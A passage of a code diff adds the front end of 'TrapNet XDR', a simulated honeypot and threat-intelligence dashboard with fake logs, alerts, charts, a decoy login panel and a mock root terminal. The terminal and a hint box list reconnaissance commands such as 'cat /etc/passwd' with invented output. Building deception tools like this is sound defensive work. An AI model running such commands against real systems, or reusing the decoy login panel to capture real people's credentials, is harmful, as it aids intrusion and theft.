+  const alerts = [];
+  const ipCounts = {};
+  logs.forEach(l => { ipCounts[l.attacker_ip] = (ipCounts[l.attacker_ip] || 0) + 1; });
+  Object.entries(ipCounts).sort((a, b) => b[1] - a[1]).slice(0, 6).forEach(([ip, count], i) => {
+    const geo = GEO_DATA[ip];
+    const sev = count >= 15 ? "CRITICAL" : count >= 10 ? "HIGH" : "MEDIUM";
+    alerts.push({
+      id: `alert-${i}`,
+      severity: sev,
+      title: `${count >= 10 ? "Brute Force Attack" : "Suspicious Activity"} — ${ip}`,
+      description: `${count} login attempts from ${geo.city}, ${geo.country} ${geo.flag}`,
+      source_ip: ip,
+      timestamp: new Date(Date.now() - rnd(0, 3600000)).toISOString(),
+      acknowledged: Math.random() > 0.75,
+    });
+  });
+  return alerts;
+}
+
+// ─── DATA STORE ──────────────────────────────────────────────────────────────
+const INIT_LOGS = generateLogs(150);
+const INIT_ALERTS = generateAlerts(INIT_LOGS);
+
+// ─── HOOKS ───────────────────────────────────────────────────────────────────
+function useClock() {
+  const [time, setTime] = useState(new Date());
+  useEffect(() => { const t = setInterval(() => setTime(new Date()), 1000); return () => clearInterval(t); }, []);
+  return time;
+}
+
+function useChart(ref, config) {
+  useEffect(() => {
+    if (!ref.current) return;
+    const ctx = ref.current.getContext('2d');
+    const ch = new Chart(ctx, config);
+    return () => ch.destroy();
+  }, []);
+}
+
+// ─── COMPONENTS ──────────────────────────────────────────────────────────────
+
+function RiskBadge({ level }) {
+  const cls = { CRITICAL: "badge-critical", HIGH: "badge-high", MEDIUM: "badge-medium", LOW: "badge-low" }[level] || "badge-low";
+  const icons = { CRITICAL: "⚡", HIGH: "🔴", MEDIUM: "🟡", LOW: "🟢" };
+  return <span className={`badge ${cls}`}>{icons[level]} {level}</span>;
+}
+
+function ServiceBadge({ service }) {
+  return <span className={`badge badge-${service}`}>{service === "ssh" ? "⌨ SSH" : "🌐 HTTP"}</span>;
+}
+
+function TimeAgo({ ts }) {
+  const diff = Math.floor((Date.now() - new Date(ts).getTime()) / 1000);
+  if (diff < 60) return <span>{diff}s ago</span>;
+  if (diff < 3600) return <span>{Math.floor(diff / 60)}m ago</span>;
+  if (diff < 86400) return <span>{Math.floor(diff / 3600)}h ago</span>;
+  return <span>{Math.floor(diff / 86400)}d ago</span>;
+}
+
+function StatCard({ label, value, delta, icon, color }) {
+  return (
+    <div className="stat-card" style={{ "--c": color }}>
+      <div className="stat-label">{label}</div>
+      <div className="stat-value">{typeof value === "number" ? value.toLocaleString() : value}</div>
+      {delta && <div className="stat-delta">{delta}</div>}
+      <div className="stat-icon">{icon}</div>
+    </div>
+  );
+}
+
+function Ticker({ logs }) {
+  const items = logs.slice(0, 12).map((l, i) => (
+    <span key={i} className="ticker-item">
+      <span className="ticker-dot" />
+      {l.geo.flag} {l.attacker_ip} — {l.service.toUpperCase()} — {l.username}:{l.password} — <RiskBadge level={l.risk.level} />
+    </span>
+  ));
+  return (
+    <div className="ticker-wrap">
+      <div className="ticker-inner">{items}{items}</div>
+    </div>
+  );
+}
+
+// ─── PAGES ───────────────────────────────────────────────────────────────────
+
+function HomePage({ logs, alerts, setPage }) {
+  const unack = alerts.filter(a => !a.acknowledged).length;
+  const critCount = logs.filter(l => l.risk.level === "CRITICAL").length;
+
+  return (
+    <div className="fade-in">
+      <div className="home-hero">
+        <div className="home-hero-title">TRAPNET XDR</div>
+        <div className="home-hero-sub">◈ CYBER DECEPTION PLATFORM · HONEYPOT INTELLIGENCE ◈</div>
+        <div className="home-hero-desc">
+          Deploy intelligent honeypots. Capture attacker behavior in real-time.
+          Analyze threats with ML. Map global attack sources. Stay one step ahead.
+        </div>
+        <div style={{ display: "flex", gap: 12, justifyContent: "center", marginTop: 28 }}>
+          <button className="btn btn-primary" onClick={() => setPage("dashboard")}>⬡ Open Dashboard</button>
+          <button className="btn btn-danger" onClick={() => setPage("honeypot")}>🕸 Enter Honeypot</button>
+          <button className="btn btn-ghost" onClick={() => setPage("logs")}>📋 View Logs</button>
+        </div>
+      </div>
+
+      <Ticker logs={logs} />
+
+      <div className="page" style={{ paddingTop: 32 }}>
+        <div className="stat-grid mb-6">
+          <StatCard label="TOTAL CAPTURES" value={logs.length} delta="↑ Active monitoring" icon="🎯" color="var(--accent)" />
+          <StatCard label="CRITICAL THREATS" value={critCount} delta="Requires immediate action" icon="⚡" color="var(--critical)" />
+          <StatCard label="ACTIVE ALERTS" value={unack} delta="Unacknowledged" icon="🔔" color="var(--high)" />
+          <StatCard label="UNIQUE ATTACKERS" value={new Set(logs.map(l => l.attacker_ip)).size} delta="Distinct source IPs" icon="👥" color="var(--accent3)" />
+        </div>
+
+        <div className="feature-grid">
+          {[
+            { icon: "🐝", title: "MULTI-SERVICE HONEYPOT", desc: "Fake SSH & HTTP login panels capture credentials, commands, and fingerprint attacker tools without any real system exposure." },
+            { icon: "🧠", title: "AI THREAT ANALYSIS", desc: "Isolation Forest anomaly detection assigns dynamic risk scores. No labeled data required — detects zero-day behavior patterns." },
+            { icon: "🌍", title: "GEO ATTACK MAPPING", desc: "Every attacker IP mapped to country, city, and coordinates. Visualize the global threat landscape in real-time." },
+            { icon: "⚡", title: "REAL-TIME ALERTS", desc: "Brute force detection, C2 beaconing alerts, and persistence mechanism detection trigger instant notifications." },
+            { icon: "🎯", title: "MITRE ATT&CK MAPPING", desc: "All captured behaviors automatically tagged with MITRE ATT&CK technique IDs for structured threat intelligence." },
+            { icon: "🔒", title: "ZERO REAL ACCESS", desc: "100% simulated environment. Honeypot never grants real shell access or exposes any production systems." },
+          ].map((f, i) => (
+            <div key={i} className="feature-card">
+              <div className="feature-icon">{f.icon}</div>
+              <div className="feature-title">{f.title}</div>
+              <div className="feature-desc">{f.desc}</div>
+            </div>
+          ))}
+        </div>
+
+        <div style={{ textAlign: "center", marginTop: 40, padding: "20px", background: "rgba(255,230,0,0.05)", border: "1px solid rgba(255,230,0,0.2)" }}>
+          <div style={{ fontFamily: "'Share Tech Mono', monospace", fontSize: 11, color: "var(--medium)", letterSpacing: 3 }}>
+            ⚠ DISCLAIMER — EDUCATIONAL & RESEARCH PLATFORM ONLY ⚠
+          </div>
+          <div style={{ fontSize: 13, color: "var(--text-dim)", marginTop: 8, maxWidth: 600, margin: "8px auto 0" }}>
+            TrapNet XDR is a cybersecurity research tool. All honeypot services are fully simulated — no real system access is ever granted.
+            Deploy only in authorized environments. Unauthorized deployment of honeypots may violate local laws.
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function HoneypotPage({ logs, setLogs }) {
+  const [activeService, setActiveService] = useState("http");
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [message, setMessage] = useState(null);
+  const [loading, setLoading] = useState(false);
+  const [termLines, setTermLines] = useState([
+    { type: "output", text: "Last login: Mon May 5 09:14:02 2026 from 10.0.0.1" },
+    { type: "output", text: "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-generic x86_64)" },
+  ]);
+  const [termInput, setTermInput] = useState("");
+  const [loggedIn, setLoggedIn] = useState(false);
+  const termRef = useRef(null);
+
+  const fakeIPs = ["91.108.4.1","177.66.10.45","123.57.12.20","104.21.48.100","45.142.212.100"];
+
+  const handleLogin = () => {
+    if (!username || !password) return;
+    setLoading(true);
+    setTimeout(() => {
+      const ip = pick(fakeIPs);
+      const geo = GEO_DATA[ip];
+      const risk = computeRisk(ip, rnd(1, 15), []);
+      const newLog = {
+        id: `live-${Date.now()}`,
+        attacker_ip: ip,
+        timestamp: new Date().toISOString(),
+        service: activeService,
+        username, password,
+        commands: [],
+        geo, risk,
+        headers: { "User-Agent": pick(USERAGENTS) },
+        mitre_tags: ["T1110"],
+        attempts: 1,
+        live: true,
+      };
+      setLogs(prev => [newLog, ...prev]);
+      setMessage({ type: "error", text: `⛔ AUTH_FAILURE — Credentials captured & logged. Session ID: ${newLog.id.slice(0, 12)}` });
+      if (activeService === "ssh") {
+        setLoggedIn(true);
+        addTermLine("output", `ssh: connect to host honeypot port 22: Connection timed out`);
+        addTermLine("output", `[TRAPNET] ⚡ CAPTURE EVENT — ${username}:${password} from ${ip} (${geo.flag} ${geo.country})`);
+      }
+      setLoading(false);
+    }, 800);
+  };
+
+  const addTermLine = (type, text) => {
+    setTermLines(prev => [...prev, { type, text }]);
+    setTimeout(() => { if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight; }, 50);
+  };
+
+  const handleTermCommand = (e) => {
+    if (e.key !== "Enter") return;
+    const cmd = termInput.trim();
+    if (!cmd) return;
+    addTermLine("prompt", `root@honeypot:~# ${cmd}`);
+    setTermInput("");
+
+    const fakeOutputs = {
+      "whoami": "root",
+      "id": "uid=0(root) gid=0(root) groups=0(root)",
+      "uname -a": "Linux honeypot-vm 5.15.0-1041-aws #46-Ubuntu SMP x86_64 GNU/Linux",
+      "ls": "bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var",
+      "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+      "ifconfig": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001\n        inet 172.31.44.200  netmask 255.255.240.0",
+      "ps aux": "  PID TTY      TIME CMD\n    1 ?    00:00:01 systemd\n  877 ?    00:00:00 sshd\n 1204 pts/0 00:00:00 bash",
+    };
+    const out = fakeOutputs[cmd] || `bash: ${cmd}: command not found`;
+    setTimeout(() => {
+      addTermLine("output", out);
+      addTermLine("output", `[TRAPNET] ⚡ COMMAND LOGGED: '${cmd}'`);
+    }, 200);
+  };
+
+  return (
+    <div className="fade-in">
+      <div className="honeypot-disclaimer">
+        ⚠ SIMULATED HONEYPOT ENVIRONMENT — NO REAL ACCESS GRANTED — FOR RESEARCH ONLY ⚠
+      </div>
+
+      <div className="honeypot-wrapper">
+        <div style={{ width: "100%", maxWidth: 860 }}>
+          <div style={{ display: "flex", gap: 12, marginBottom: 24, justifyContent: "center" }}>
+            {["http","ssh"].map(svc => (
+              <button key={svc} className={`btn ${activeService === svc ? "btn-primary" : "btn-ghost"}`}
+                onClick={() => { setActiveService(svc); setMessage(null); setLoggedIn(false); }}>
+                {svc === "ssh" ? "⌨ SSH TERMINAL" : "🌐 HTTP LOGIN PANEL"}
+              </button>
+            ))}
+          </div>
+
+          <div style={{ display: "grid", gridTemplateColumns: activeService === "ssh" ? "1fr 1fr" : "1fr", gap: 24 }}>
+            {/* Login Panel */}
+            <div className="login-panel">
+              <div className="login-header">
+                <div className="login-brand">
+                  {activeService === "http" ? "◈ CORPORATE PORTAL" : "◈ SECURE SHELL ACCESS"}
+                </div>
+                <div className="login-service-badge">
+                  {activeService === "http" ? "🌐 HTTP/443 — NGINX 1.18.0" : "⌨ SSH/22 — OpenSSH_8.9p1"}
+                </div>
+                <div style={{ fontSize: 12, color: "var(--text-dim)", marginTop: 4 }}>
+                  {activeService === "http"
+                    ? "Enter credentials to access the admin dashboard"
+                    : "SSH authentication required. Enter username and private key passphrase."}
+                </div>
+              </div>
+
+              <div className="login-form">
+                {message && (
+                  <div className={message.type === "error" ? "login-error" : "login-success"}>
+                    {message.text}
+                  </div>
+                )}
+
+                <div className="form-group">
+                  <label className="input-label">
+                    {activeService === "ssh" ? "SSH USERNAME" : "EMAIL / USERNAME"}
+                  </label>
+                  <input className="input-field" value={username} onChange={e => setUsername(e.target.value)}
+                    placeholder={activeService === "ssh" ? "root" : "admin@company.com"}
+                    onKeyDown={e => e.key === "Enter" && handleLogin()} />
+                </div>
+                <div className="form-group">
+                  <label className="input-label">
+                    {activeService === "ssh" ? "PASSPHRASE / PASSWORD" : "PASSWORD"}
+                  </label>
+                  <input className="input-field" type="password" value={password} onChange={e => setPassword(e.target.value)}
+                    placeholder="••••••••••"
+                    onKeyDown={e => e.key === "Enter" && handleLogin()} />
+                </div>
+
+                <button className="btn btn-primary" style={{ width: "100%", justifyContent: "center", marginTop: 4 }}
+                  onClick={handleLogin} disabled={loading}>
+                  {loading ? "◈ AUTHENTICATING..." : activeService === "ssh" ? "⌨ CONNECT" : "→ SIGN IN"}
+                </button>
+
+                <div style={{ marginTop: 14, fontSize: 11, color: "var(--text-dim)", fontFamily: "'Share Tech Mono',monospace", textAlign: "center" }}>
+                  {activeService === "http"
+                    ? "Forgot password? Contact IT support ext. 2001"
+                    : "Connection: TLS 1.3 · Host key fingerprint: SHA256:abc123..."}
+                </div>
+              </div>
+            </div>
+
+            {/* SSH Terminal */}
+            {activeService === "ssh" && (
+              <div>
+                <div className="terminal-window">
+                  <div className="terminal-titlebar">
+                    <div className="term-dot term-dot-r" />
+                    <div className="term-dot term-dot-y" />
+                    <div className="term-dot term-dot-g" />
+                    <div className="terminal-title">bash — root@honeypot — 80×24</div>
+                  </div>
+                  <div className="terminal-body" ref={termRef}>
+                    {termLines.map((line, i) => (
+                      <div key={i} className={`term-line ${line.type === "prompt" ? "term-prompt" : line.text.includes("TRAPNET") ? "" : "term-output"}`}
+                        style={{ color: line.text.includes("TRAPNET") ? "var(--accent2)" : undefined }}>
+                        {line.text}
+                      </div>
+                    ))}
+                    <div className="term-input-row">
+                      <span className="term-line term-prompt">root@honeypot:~# </span>
+                      <input className="term-input" value={termInput}
+                        onChange={e => setTermInput(e.target.value)}
+                        onKeyDown={handleTermCommand}
+                        placeholder="type a command..." />
+                    </div>
+                  </div>
+                </div>
+                <div style={{ marginTop: 12, padding: 12, background: "rgba(255,60,110,0.06)", border: "1px solid rgba(255,60,110,0.2)" }}>
+                  <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: "var(--critical)", letterSpacing: 2 }}>
+                    ⚡ HONEYPOT ACTIVE — ALL COMMANDS LOGGED
+                  </div>
+                  <div style={{ fontSize: 12, color: "var(--text-dim)", marginTop: 4 }}>
+                    Try: whoami, id, uname -a, cat /etc/passwd, ls, ifconfig
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+
+          {/* Live capture feed */}
+          <div className="card" style={{ marginTop: 24 }}>
+            <div className="card-title">⚡ LIVE CAPTURE FEED</div>
+            {logs.filter(l => l.live).slice(0, 5).map((l, i) => (
+              <div key={i} style={{ display: "flex", gap: 12, padding: "8px 0", borderBottom: "1px solid rgba(26,48,64,0.4)", fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: "var(--text-dim)" }}>
+                <span style={{ color: "var(--accent2)" }}>⚡ NEW</span>
+                <span>{l.geo.flag} {l.attacker_ip}</span>
+                <span style={{ color: "var(--accent)" }}>{l.service.toUpperCase()}</span>
+                <span>{l.username}:{l.password}</span>
+                <span style={{ marginLeft: "auto" }}><RiskBadge level={l.risk.level} /></span>
+                <TimeAgo ts={l.timestamp} />
+              </div>
+            ))}
+            {logs.filter(l => l.live).length === 0 && (
+              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: "var(--text-dim)", padding: "12px 0" }}>
+                No live captures yet. Try logging in above →
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function DashboardPage({ logs, alerts }) {
+  const chartRefs = {
+    timeline: useRef(null),
+    risk: useRef(null),
+    service: useRef(null),
+    mitre: useRef(null),
+  };
+
+  const ipCounts = {};
+  logs.forEach(l => { ipCounts[l.attacker_ip] = (ipCounts[l.attacker_ip] || 0) + 1; });
+  const topIPs = Object.entries(ipCounts).sort((a,b)=>b[1]-a[1]).slice(0,8);
+
+  const credCounts = {};
+  logs.forEach(l => { const k = `${l.username}/${l.password}`; credCounts[k] = (credCounts[k]||0)+1; });
+  const topCreds = Object.entries(credCounts).sort((a,b)=>b[1]-a[1]).slice(0,8);
+
+  const riskDist = { CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0 };
+  logs.forEach(l => riskDist[l.risk.level]++);
+
+  const serviceDist = { ssh: 0, http: 0 };
+  logs.forEach(l => serviceDist[l.service]++);
+
+  const mitreCount = {};
+  logs.forEach(l => l.mitre_tags.forEach(t => { mitreCount[t] = (mitreCount[t]||0)+1; }));
+  const topMitre = Object.entries(mitreCount).sort((a,b)=>b[1]-a[1]).slice(0,7);
+
+  // Timeline: last 24 hours by hour
+  const now = Date.now();
+  const hourBuckets = {};
+  for (let h = 23; h >= 0; h--) {
+    const label = `${String(new Date(now - h*3600000).getHours()).padStart(2,"0")}:00`;
+    hourBuckets[label] = 0;
+  }
+  logs.forEach(l => {
+    const diff = now - new Date(l.timestamp).getTime();
+    if (diff < 86400000) {
+      const label = `${String(new Date(l.timestamp).getHours()).padStart(2,"0")}:00`;
+      if (label in hourBuckets) hourBuckets[label]++;
+    }
+  });
+
+  const CHART_DEFAULTS = {
+    responsive: true, maintainAspectRatio: false,
+    plugins: { legend: { display: false }, tooltip: {
+      backgroundColor: "#0a1520", borderColor: "#1a3040", borderWidth: 1,
+      titleColor: "#00d4ff", bodyColor: "#c8e6f5",
+      titleFont: { family: "'Share Tech Mono'" }, bodyFont: { family: "'Share Tech Mono'" },
+    }},
+  };
+
+  useEffect(() => {
+    const charts = [];
+
+    if (chartRefs.timeline.current) {
+      charts.push(new Chart(chartRefs.timeline.current.getContext("2d"), {
+        type: "line",
+        data: {
+          labels: Object.keys(hourBuckets),
+          datasets: [{
+            data: Object.values(hourBuckets),
+            borderColor: "#00d4ff", backgroundColor: "rgba(0,212,255,0.08)",
+            fill: true, tension: 0.4, pointBackgroundColor: "#00d4ff",
+            pointRadius: 3, borderWidth: 2,
+          }],
+        },
+        options: { ...CHART_DEFAULTS,
+          scales: {
+            x: { ticks: { color: "#4a7a99", font: { family:"'Share Tech Mono'", size:9 }, maxRotation:45 }, grid: { color:"rgba(26,48,64,0.4)" } },
+            y: { ticks: { color: "#4a7a99", font: { family:"'Share Tech Mono'", size:9 } }, grid: { color:"rgba(26,48,64,0.4)" } },
+          },
+        },
+      }));
+    }
+
+    if (chartRefs.risk.current) {
+      charts.push(new Chart(chartRefs.risk.current.getContext("2d"), {
+        type: "doughnut",
+        data: {
+          labels: Object.keys(riskDist),
+          datasets: [{
+            data: Object.values(riskDist),
+            backgroundColor: ["rgba(255,60,110,0.7)","rgba(255,159,0,0.7)","rgba(255,230,0,0.7)","rgba(57,255,20,0.7)"],
+            borderColor: ["#ff3c6e","#ff9f00","#ffe600","#39ff14"],
+            borderWidth: 1,
+          }],
+        },
+        options: {
+          ...CHART_DEFAULTS,
+          plugins: {
+            ...CHART_DEFAULTS.plugins,
+            legend: { display: true, position: "right", labels: { color:"#4a7a99", font:{family:"'Share Tech Mono'",size:10}, boxWidth:12 }},
+          },
+          cutout: "65%",
+        },
+      }));
+    }
+
+    if (chartRefs.service.current) {
+      charts.push(new Chart(chartRefs.service.current.getContext("2d"), {
+        type: "bar",
+        data: {
+          labels: ["SSH","HTTP"],
+          datasets: [{
+            data: [serviceDist.ssh, serviceDist.http],
+            backgroundColor: ["rgba(0,212,255,0.3)","rgba(168,85,247,0.3)"],
+            borderColor: ["#00d4ff","#a855f7"],
+            borderWidth: 1,
+          }],
+        },
+        options: { ...CHART_DEFAULTS,
+          scales: {
+            x: { ticks: { color:"#4a7a99", font:{family:"'Share Tech Mono'",size:11} }, grid:{color:"rgba(26,48,64,0.4)"} },
+            y: { ticks: { color:"#4a7a99", font:{family:"'Share Tech Mono'",size:9} }, grid:{color:"rgba(26,48,64,0.4)"} },
+          },
+        },
+      }));
+    }
+
+    if (chartRefs.mitre.current) {
+      charts.push(new Chart(chartRefs.mitre.current.getContext("2d"), {
+        type: "bar",
+        data: {
+          labels: topMitre.map(([t]) => t),
+          datasets: [{
+            data: topMitre.map(([,c]) => c),
+            backgroundColor: "rgba(255,60,110,0.3)",
+            borderColor: "#ff3c6e",
+            borderWidth: 1,
+          }],
+        },
+        options: { ...CHART_DEFAULTS,
+          indexAxis: "y",
+          scales: {
+            x: { ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, grid:{color:"rgba(26,48,64,0.4)"} },
+            y: { ticks:{color:"#00d4ff",font:{family:"'Share Tech Mono'",size:11}}, grid:{color:"rgba(26,48,64,0.4)"} },
+          },
+        },
+      }));
+    }
+
+    return () => charts.forEach(c => c.destroy());
+  }, []);
+
+  const avgRisk = Math.round(logs.reduce((s,l) => s + l.risk.score, 0) / logs.length);
+  const unack = alerts.filter(a => !a.acknowledged).length;
+
+  return (
+    <div className="page fade-in">
+      <div className="page-header">
+        <div>
+          <div className="page-title">DASHBOARD</div>
+          <div className="page-subtitle">REAL-TIME THREAT INTELLIGENCE OVERVIEW</div>
+        </div>
+      </div>
+
+      <div className="stat-grid mb-6">
+        <StatCard label="TOTAL CAPTURES" value={logs.length} delta={`${logs.filter(l=>new Date(l.timestamp)>new Date(Date.now()-86400000)).length} in last 24h`} icon="🎯" color="var(--accent)" />
+        <StatCard label="CRITICAL THREATS" value={riskDist.CRITICAL} delta={`${Math.round(riskDist.CRITICAL/logs.length*100)}% of total`} icon="⚡" color="var(--critical)" />
+        <StatCard label="ACTIVE ALERTS" value={unack} delta="Requires attention" icon="🔔" color="var(--high)" />
+        <StatCard label="AVG RISK SCORE" value={avgRisk} delta="0–100 scale" icon="📊" color="var(--accent3)" />
+      </div>
+
+      {/* Timeline + Risk Donut */}
+      <div className="grid-2-1 mb-4">
+        <div className="card">
+          <div className="card-title"><span className="card-title-icon">📈</span>ATTACK TIMELINE — LAST 24 HOURS</div>
+          <div className="chart-wrap"><canvas ref={chartRefs.timeline} /></div>
+        </div>
+        <div className="card">
+          <div className="card-title"><span className="card-title-icon">🎯</span>RISK DISTRIBUTION</div>
+          <div className="chart-wrap"><canvas ref={chartRefs.risk} /></div>
+        </div>
+      </div>
+
+      {/* Top IPs + Service + MITRE */}
+      <div className="grid-3 mb-4">
+        <div className="card">
+          <div className="card-title"><span className="card-title-icon">🌐</span>TOP ATTACKING IPs</div>
+          {topIPs.map(([ip, count], i) => (
+            <div key={ip} className="progress-row">
+              <div className="progress-label">{GEO_DATA[ip]?.flag} {ip}</div>
+              <div className="progress-bar"><div className="progress-fill" style={{ width: `${count/topIPs[0][1]*100}%` }} /></div>
+              <div className="progress-count">{count}</div>
+            </div>
+          ))}
+        </div>
+        <div className="card">
+          <div className="card-title"><span className="card-title-icon">🔑</span>TOP CREDENTIALS</div>
+          {topCreds.map(([cred, count], i) => (
+            <div key={cred} className="progress-row">
+              <div className="progress-label" title={cred}>{cred}</div>
+              <div className="progress-bar"><div className="progress-fill" style={{ width: `${count/topCreds[0][1]*100}%`, background: "linear-gradient(90deg,var(--accent2),var(--high))" }} /></div>
+              <div className="progress-count">{count}</div>
+            </div>
+          ))}
+        </div>
+        <div className="card">
+          <div className="card-title"><span className="card-title-icon">🛡</span>MITRE ATT&CK TECHNIQUES</div>
+          <div className="chart-wrap-sm"><canvas ref={chartRefs.mitre} /></div>
+        </div>
+      </div>
+
+      {/* Service Split + World Map (ASCII) */}
+      <div className="grid-2-1">
+        <div className="card">
+          <div className="card-title"><span className="card-title-icon">🌍</span>ATTACKER ORIGIN — TOP COUNTRIES</div>
+          {(() => {
+            const cc = {};
+            logs.forEach(l => { cc[l.geo.country] = (cc[l.geo.country]||0)+1; });
+            return Object.entries(cc).sort((a,b)=>b[1]-a[1]).slice(0,8).map(([c,n]) => {
+              const geo = Object.values(GEO_DATA).find(g => g.country === c);
+              return (
+                <div key={c} className="progress-row">
+                  <div className="progress-label">{geo?.flag} {c}</div>
+                  <div className="progress-bar"><div className="progress-fill" style={{ width: `${n/logs.length*100}%`, background:"linear-gradient(90deg,var(--accent3),var(--accent))" }} /></div>
+                  <div className="progress-count">{n}</div>
+                </div>
+              );
+            });
+          })()}
+        </div>
+        <div className="card">
+          <div className="card-title"><span className="card-title-icon">🔗</span>SERVICE BREAKDOWN</div>
+          <div className="chart-wrap"><canvas ref={chartRefs.service} /></div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function LogsPage({ logs, alerts }) {
+  const [filterRisk, setFilterRisk] = useState("ALL");
+  const [filterService, setFilterService] = useState("ALL");
+  const [search, setSearch] = useState("");
+  const [selected, setSelected] = useState(null);
+  const [page, setPage] = useState(0);
+  const PER_PAGE = 20;
+
+  const filtered = logs.filter(l => {
+    if (filterRisk !== "ALL" && l.risk.level !== filterRisk) return false;
+    if (filterService !== "ALL" && l.service !== filterService) return false;
+    if (search && !l.attacker_ip.includes(search) && !l.username.includes(search) && !l.password.includes(search)) return false;
+    return true;
+  });
+
+  const paged = filtered.slice(page * PER_PAGE, (page+1) * PER_PAGE);
+  const totalPages = Math.ceil(filtered.length / PER_PAGE);
+
+  return (
+    <div className="page fade-in">
+      <div className="page-header">
+        <div>
+          <div className="page-title">ATTACK LOGS</div>
+          <div className="page-subtitle">{filtered.length} RECORDS MATCHING FILTER</div>
+        </div>
+        <div className="page-actions">
+          <button className="btn btn-ghost" onClick={() => { setFilterRisk("ALL"); setFilterService("ALL"); setSearch(""); }}>↺ RESET</button>
+        </div>
+      </div>
+
+      <div className="filter-bar">
+        <input className="input-field" style={{ width: 220 }} value={search}
+          onChange={e => { setSearch(e.target.value); setPage(0); }}
+          placeholder="Search IP, username, password..." />
+        <select className="filter-select" value={filterRisk} onChange={e => { setFilterRisk(e.target.value); setPage(0); }}>
+          <option value="ALL">All Risk Levels</option>
+          <option value="CRITICAL">Critical</option>
+          <option value="HIGH">High</option>
+          <option value="MEDIUM">Medium</option>
+          <option value="LOW">Low</option>
+        </select>
+        <select className="filter-select" value={filterService} onChange={e => { setFilterService(e.target.value); setPage(0); }}>
+          <option value="ALL">All Services</option>
+          <option value="ssh">SSH</option>
+          <option value="http">HTTP</option>
+        </select>
+        <div style={{ marginLeft: "auto", fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: "var(--text-dim)" }}>
+          Page {page+1} / {totalPages}
+        </div>
+      </div>
+
+      <div style={{ display: "grid", gridTemplateColumns: selected ? "1fr 380px" : "1fr", gap: 16 }}>
+        <div className="card" style={{ padding: 0, overflow: "hidden" }}>
+          <table className="data-table">
+            <thead>
+              <tr>
+                <th>TIMESTAMP</th>
+                <th>IP ADDRESS</th>
+                <th>LOCATION</th>
+                <th>SERVICE</th>
+                <th>USERNAME</th>
+                <th>PASSWORD</th>
+                <th>RISK</th>
+                <th>MITRE</th>
+              </tr>
+            </thead>
+            <tbody>
+              {paged.map(log => (
+                <tr key={log.id} onClick={() => setSelected(selected?.id === log.id ? null : log)}
+                  style={{ cursor: "pointer", background: selected?.id === log.id ? "rgba(0,212,255,0.05)" : undefined }}>
+                  <td style={{ color: "var(--text-dim)", whiteSpace: "nowrap" }}>
+                    <TimeAgo ts={log.timestamp} />
+                  </td>
+                  <td style={{ color: "var(--accent)", fontWeight: 700 }}>{log.attacker_ip}</td>
+                  <td>{log.geo.flag} {log.geo.city}</td>
+                  <td><ServiceBadge service={log.service} /></td>
+                  <td style={{ color: "var(--accent3)" }}>{log.username}</td>
+                  <td style={{ color: "var(--accent2)" }}>{log.password}</td>
+                  <td><RiskBadge level={log.risk.level} /></td>
+                  <td>{log.mitre_tags.map(t => <span key={t} className="mitre-tag">{t}</span>)}</td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+          <div style={{ padding: "12px 16px", display: "flex", gap: 8, borderTop: "1px solid var(--border)" }}>
+            <button className="btn btn-ghost" onClick={() => setPage(p => Math.max(0, p-1))} disabled={page === 0}>◁ PREV</button>
+            <button className="btn btn-ghost" onClick={() => setPage(p => Math.min(totalPages-1, p+1))} disabled={page >= totalPages-1}>NEXT ▷</button>
+          </div>
+        </div>
+
+        {selected && (
+          <div className="card fade-in" style={{ alignSelf: "start" }}>
+            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 16 }}>
+              <div className="card-title">📋 LOG DETAIL</div>
+              <button className="btn btn-ghost" style={{ padding: "2px 8px" }} onClick={() => setSelected(null)}>✕</button>
+            </div>
+            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, lineHeight: 2 }}>
+              {[
+                ["ID", selected.id.slice(0,16) + "..."],
+                ["IP", selected.attacker_ip],
+                ["LOCATION", `${selected.geo.flag} ${selected.geo.city}, ${selected.geo.country}`],
+                ["COORDS", `${selected.geo.lat.toFixed(2)}, ${selected.geo.lon.toFixed(2)}`],
+                ["SERVICE", selected.service.toUpperCase()],
+                ["USERNAME", selected.username],
+                ["PASSWORD", selected.password],
+                ["RISK SCORE", `${selected.risk.score}/100`],
+                ["RISK LEVEL", selected.risk.level],
+                ["TIMESTAMP", new Date(selected.timestamp).toLocaleString()],
+                ["USER-AGENT", selected.headers["User-Agent"] || "—"],
+              ].map(([k, v]) => (
+                <div key={k} style={{ display: "flex", gap: 8 }}>
+                  <span style={{ color: "var(--text-dim)", width: 90 }}>{k}</span>
+                  <span style={{ color: "var(--text)", flex: 1, wordBreak: "break-all" }}>{v}</span>
+                </div>
+              ))}
+              <div style={{ marginTop: 8 }}>
+                <div style={{ color: "var(--text-dim)" }}>MITRE TAGS</div>
+                <div style={{ marginTop: 4 }}>{selected.mitre_tags.map(t => <span key={t} className="mitre-tag">{t}</span>)}</div>
+              </div>
+              {selected.commands.length > 0 && (
+                <div style={{ marginTop: 8 }}>
+                  <div style={{ color: "var(--text-dim)", marginBottom: 4 }}>COMMANDS EXECUTED</div>
+                  {selected.commands.map((c, i) => (
+                    <div key={i} style={{ color: "var(--accent3)", background: "var(--bg0)", padding: "3px 8px", marginBottom: 2 }}>$ {c}</div>
+                  ))}
+                </div>
+              )}
+              <div style={{ marginTop: 12 }}>
+                <div style={{ color: "var(--text-dim)", marginBottom: 6 }}>RISK METER</div>
+                <div className="risk-bar-track">
+                  <div className="risk-bar-fill" style={{
